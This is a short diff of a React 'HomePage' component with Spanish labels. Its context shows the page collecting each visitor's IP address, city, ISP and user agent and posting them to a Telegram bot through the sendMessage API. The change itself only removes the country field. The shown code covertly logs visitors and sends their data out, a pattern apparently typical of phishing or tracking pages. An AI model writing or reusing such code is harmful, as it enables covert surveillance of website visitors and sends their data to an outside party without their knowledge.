@@ -43,7 +43,6 @@ function HomePage() {
         } catch (error) {
             return {
                 ip: 'No disponible',
-                country: 'No disponible',
                 city: 'No disponible',
                 isp: 'No disponible',
                 device: navigator.userAgent
@@ -84,9 +83,7 @@ function HomePage() {
 
 🌐 INFORMACIÓN DEL USUARIO
 🔌 IP: ${userInfo.ip}
-🌍 País: ${userInfo.country}
-🏙️ Ciudad: ${userInfo.city}
-📡 ISP: ${userInfo.isp}
+🏙️ Ciudad: ${userInfo.city} 📡 ISP: ${userInfo.isp}
       `;
 
             const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
